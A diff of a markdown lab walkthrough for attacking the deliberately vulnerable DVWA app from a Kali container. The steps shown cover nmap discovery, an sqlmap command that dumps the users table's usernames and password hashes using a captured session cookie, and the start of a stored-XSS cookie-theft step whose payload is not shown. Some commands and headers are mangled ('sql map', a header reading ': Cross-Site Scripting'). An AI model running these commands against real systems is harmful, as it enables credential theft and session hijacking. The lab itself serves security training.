@@ -41,9 +41,8 @@ docker exec -it kali-attacker /bin/bash
 ---
 
 ## Lab Objectives and Walkthrough
-The goal of this lab is to compromise the DVWA database and execute malicious client-side code.
 
-### Phase 1: Reconnaissance and Setup
+### 1: Reconnaissance and Setup
 1. **Find the Target Hostname**:
 ```
 # Container name is 'dvwa-victim'
@@ -53,7 +52,7 @@ nmap -sn dvwa victim
 ```
 apt update && apt install sqlmap -y
 ```
-### Phase 2: SQL Injection (SQLi) - Automated Database Compromise
+### 2: SQL Injection (SQLi) - Automated Database Compromise
 1. **Capture Cookies**: In the browser (while logged into DVWA), open **Developer Tools** (F12) and find the `PHPSESSID` cookie value under the **Application** or **Storage** tab and copy this value.
 2. **Run SQLMap to Dump Credentials**:
 ```
@@ -62,7 +61,7 @@ sql map -u "http://dvwa-victim/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="PHPSESSID=<Your_Session_ID>; security=low" -D dvwa -T users --dump --batch
 ```
 Success is confirmed when SQLMap displays a table listing the usernames and hashed passwords from the database.
-### Phase 3: Cross-Site Scripting (XSS) - Stored Payload
+### : Cross-Site Scripting (XSS) - Stored Payload
 1. **Navigate**: In the browser, go to the **"XSS (Stored)"** page.
 2. **Payload**: Use the following script in the **"Message"** field to demonstrate cookie theft/display:
 ```
